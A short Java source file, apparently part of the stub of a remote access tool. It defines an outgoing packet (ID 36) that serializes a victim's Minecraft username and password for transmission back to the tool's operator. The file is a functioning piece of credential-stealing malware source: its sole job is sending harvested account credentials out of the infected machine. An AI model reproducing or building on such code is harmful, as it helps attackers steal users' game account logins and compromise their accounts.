package com.redpois0n.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet36MinecraftPassword extends AbstractOutgoingPacket {
	
	private String username;
	private String password;

	public Packet36MinecraftPassword(String username, String password) {
		this.username = username;
		this.password = password;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(username);
		sw.writeLine(password);
	}

	@Override
	public byte getPacketId() {
		return 36;
	}

}
